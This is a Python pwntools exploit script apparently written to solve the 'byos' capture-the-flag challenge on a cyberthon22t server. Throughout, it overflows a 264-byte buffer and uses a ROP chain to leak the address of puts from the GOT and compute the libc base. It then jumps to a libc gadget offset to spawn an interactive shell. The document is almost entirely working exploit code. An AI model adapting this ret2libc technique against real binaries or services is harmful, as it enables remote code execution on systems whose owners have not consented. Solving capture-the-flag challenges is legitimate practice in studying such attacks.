from pwn import *
context.log_level = 'debug'
elf = context.binary = ELF("./byos")
rop = ROP('./byos')
p = connect("chals.cyberthon22t.ctf.sg", 20201)
#gdb.attach(p)

# > finding the libc base <

offset = 8 + 256
puts_main = elf.symbols['puts'] # in the future can just remove this
puts_got = elf.got['puts']

log.info("main puts function is " + hex(puts_main))
log.info(f"puts got is {hex(puts_got)}")
log.info(f"poprdi is {hex(rop.rdi.address)}")

payload1 = flat(
	b"A"*offset,
	rop.rdi.address, puts_got,
	puts_main,
	elf.symbols['main']
)

p.recvuntil("Enter Input => ")
p.sendline(payload1)

puts_libc = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("puts addr in libc is " + hex(puts_libc))
# with the possible puts addr, find the possible libraries
# (search on online database)
# declare libc architecture
libc = ELF('./libc.so.6')

# pwntools will read function offsets from the libc
log.info("libc puts offset is " + hex(libc.symbols['puts']))
libc_base = puts_libc - libc.symbols['puts']
log.info("libc base is " + hex(libc_base))

# the syscall will exist in the libc, so search the libc for syscall gadgets
system_off = 0x4f2a5
system_addr = libc_base + system_off
log.info(hex(system_addr))

p.recvuntil("Enter Input => ")
payload2 = flat(
	b"A"*offset,
	system_addr
)

p.sendline(payload2)

p.interactive()

